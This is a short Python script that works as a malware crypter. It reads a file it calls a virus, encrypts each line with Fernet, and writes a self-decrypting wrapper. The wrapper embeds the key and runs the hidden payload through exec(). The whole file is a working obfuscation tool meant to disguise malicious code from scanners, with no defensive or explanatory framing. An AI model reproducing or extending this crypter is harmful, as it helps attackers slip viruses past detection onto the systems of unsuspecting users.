import cryptography
from cryptography.fernet import Fernet

payload = []
encode = []
secret_key = b''


def ask_for_filename():
  print("Name of the file you want to encrypt: ")
  file_name = input()
  return file_name


def read_payload(file_name):
  with open(file_name, 'r') as virus:
    for line in virus:
      payload.append(line)


def generate_key():
  global secret_key
  secret_key = Fernet.generate_key()


def encrypt_payload():
  fernet = Fernet(secret_key)
  for elem in payload:
    encode.append(fernet.encrypt(elem.encode()))


def ask_for_encrypted_filename():
  print("Name of the file with the encrypted virus: ")
  encypted_virus_filename = input()
  return encypted_virus_filename


def write_virus(encrypted_virus_name):
  with open(encrypted_virus_name, "w") as virus:
    virus.write("##### START VIRUS #####\n")
    virus.write('\n##### ENCRYPT #####\n')
    virus.write("encrypted_payload = [b'" + (b"',b'".join(encode)).decode() + "']")
    virus.write("\n##### END ENCRYPT #####\n")
    decryption = """
from cryptography.fernet import Fernet

decrypted_payload = []

def decrypt_payload():
  fernet = Fernet(b'""" + secret_key.decode() + """')
  for elem in encrypted_payload:
    decrypted_payload.append((fernet.decrypt(elem)).decode())

decrypt_payload()
exec("".join(decrypted_payload))
"""
    virus.write(decryption)
    virus.write("\n###### END VIRUS ######\n")


if __name__ == '__main__':
  read_payload(ask_for_filename())
  generate_key()
  encrypt_payload()
  write_virus(ask_for_encrypted_filename())